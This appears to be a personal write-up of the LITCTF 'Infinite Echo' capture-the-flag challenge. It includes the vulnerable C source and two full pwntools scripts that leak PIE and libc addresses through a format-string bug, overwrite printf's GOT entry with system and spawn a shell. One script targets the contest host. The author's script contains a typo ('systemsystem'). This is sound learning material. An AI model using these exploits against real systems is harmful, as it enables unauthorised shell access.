

#format-string-leak #no-solve #GOT-overwrite 



![[ld-2.31.so]]

![[main]]

![[main.c]]

![[libc-2.31.so]]


## Reflection

I did not manage to get the flag this weekend. I managed to get an exploit working for the local version but ran into trouble when attempting to exploit the remote version. It quickly became evident there was a difference between my VM and the server. For example, while fuzzing, I could leak the main function address which was at `%43$p` on the stack locally, but this was at position `%45$p` on the version running on the server.

| remote                                                                                                                    | local                                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| 41: b'0x74fcfd283083\n'<br>42: b'0x1\n'<br>43: b'0x7ffde893af98\n'<br>44: b'0x1fd4477a0\n'<br>==45: b'0x56f8c943c1c9\n'== | 41: b'0x7fdcfdb93c8a\n'<br>42: b'0x7ffe0cd7e4f0\n'<br>==43: b'0x556a0dc931c9\n'==<br>44: b'0x10dc92040\n'<br>45: b'0x7ffe0cd7e508\n'<br> |
|                                                                                                                           |                                                                                                                                          |

After asking in the discord, someone suggested I use pwninit to make sure the binary was loading the given libc version not my local one. Now it's said, that makes sense. The script I managed to use locally is below: After using pwninit and patching the elf, i can see now what was going wrong. working solution posted 

Following this - [[pwninit]] will be used to patch the elf


#my-solution 
```
#!/usr/bin/env python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Function to be called by FmtStr
def send_payload(payload):
    io.sendline(payload)
    return io.recvline()

def exec_fmt(payload):
    p = process(exe)
    p.recvline()   
    p.sendline(payload)
    return  p.recvline()


exe = './main'

elf = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'error'

# ===========================================================
io = start()


format_string = FmtStr(exec_fmt)

# Leak main address
io.recvline()
io.sendline('%43$p'.encode())
main_address = int(io.recvline(), 16)
print("main address: ", hex(main_address))
elf.address = main_address - 0x11c9
print("piebase address: ", hex(elf.address))

# leak the libc_start_main+133
io.sendline('%61$p'.encode())
libc_start_main = int(io.recvline(), 16) - 133
libc_base = libc_start_main -  libc.symbols.__libc_start_main 
libc.address = libc_base

print("LIBC Base: ", hex(libc.address))
print(f"Value of elf.got['printf']: {hex(elf.got.printf)}")
print(f"Value of libc.symbols['system']: {hex(libc.symbols.systemsystem)}")

print("Address of what we want to overwrite: ", hex(elf.got.printf))
print("Address of what to overwrite it with: ", hex(libc.symbols.system))
payload = fmtstr_payload(6, {elf.got.printf : libc.symbols.system})

io.sendline(payload)
io.recvline

io.sendline(b'/bin/sh')

io.interactive()

```


#alt-solution - discord user TSUNE
```
from pwn import * 
e = ELF("main") 
libc = ELF("libc-2.31.so") 
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6") 
context.binary = e 
#p = e.process() 
p = remote("litctf.org", 31772) 
buf = 6 
""" not used.. ret = p64(0x000000000000101a) pop_rdi = p64(0x00000000000012c3) binsh = p64(next(libc.search(b"/bin/sh\x00"))) """ 
payload1 = b"%3$lx" 
#read+18 
print(p.recvline().decode()) 
p.sendline(payload1) 
addr = int(p.recvline().decode().strip(),16) 
print(f"read +18 @ {hex(addr)}") 
base = addr - 18 - libc.sym['read'] 
libc.address = base 
payload2 = b"%28$lx" 
p.sendline(payload2) 
addr = int(p.recvline().decode().strip(),16) 
print(f"base +0x40 @ {hex(addr)}") 
binbase = addr - 0x40 
e.address = binbase 
payload3 = fmtstr_payload(buf, {e.got['printf'] : libc.sym['system']}) p.sendline(payload3) p.sendline(b"/bin/sh") 
p.interactive()
```


### main.c
```
#include <stdio.h>
#include <unistd.h>

int main() {
	setbuf(stdout, 0x0);
	setbuf(stderr, 0x0);
	
	char buf[256];
	
	printf("Infinite Echo!\n");
	while (1 == 1) {
		buf[read(0, buf, 256) - 1] = 0;
		printf(buf);
		printf("\n");
	}
}
```

On first viewing, this looks like a format string vuln, but with the lack of any tangible target, we might need to overwrite something to pop a shell.

### Checksec:`

| RELRO         | STACK CANARY    | NX         | PIE         | RPATH    | RUNPATH    | Symbols    | FORTIFY | Fortified | Fortifiable | FILE |
| ------------- | --------------- | ---------- | ----------- | -------- | ---------- | ---------- | ------- | --------- | ----------- | ---- |
| Partial RELRO | No canary found | NX enabled | PIE enabled | No RPATH | No RUNPATH | 72 Symbols | No      | 0         | 2           | main |

### file:

```
─$ file main
main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=17ab92a2379f88d5dbe7082cf0942e56204f54aa, for GNU/Linux 3.2.0, not stripped
```

Pie enabled - 

## Method:

To start with, Checksec and file elf details as above. Only partial relro so GOT overwrite should be possible with format string vuln

### Bypass PIE by finding PIE base
#### finding main offset

using objdump we can find the main offset:

`──(kali㉿kali)-[~/Documents/LITCTF 24/pwn/infinite echo]
`└─$ objdump -t main     
`00000000000011c9 g     F .text  0000000000000097              main`

`main - base offset = 0x11c9`

Now, after running the usual fuzzing script, we can see the main address is :
`43: b'558d52e901c9\n'`

If we subtract 0x11c9, that should give us the piebase

## Finding libc base

we now need to leak a value which can be used to determine libc base:

`23:0118│+008     0x7fffffffdd28 —▸ 0x7ffff7decc8a (__libc_start_call_main+122) ◂— mov edi, eax

This corresponds to:
`61: b'7fbd79d9cd45\n'`
Therefore, we can calculate libc base by finding the offset of this version of libc, subtracting 122 from the leaked address then subtracting the offset from the leaked address.

```
libc_start_main = int(io.recvline(), 16) - 133
libc_base = libc_start_main -  libc.symbols.__libc_start_main 
```


We've already calculated the position on the stack as 6 thanks to the fuzzing script so now we can craft the payload using fmtstr
```
print("Address of what we want to overwrite: ", hex(elf.got.printf))
print("Address of what to overwrite it with: ", hex(libc.symbols.system))
payload = fmtstr_payload(6, {elf.got.printf : libc.symbols.system})
```


Success!

```
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x5 bytes:
    b'kali\n'
kali
$  
```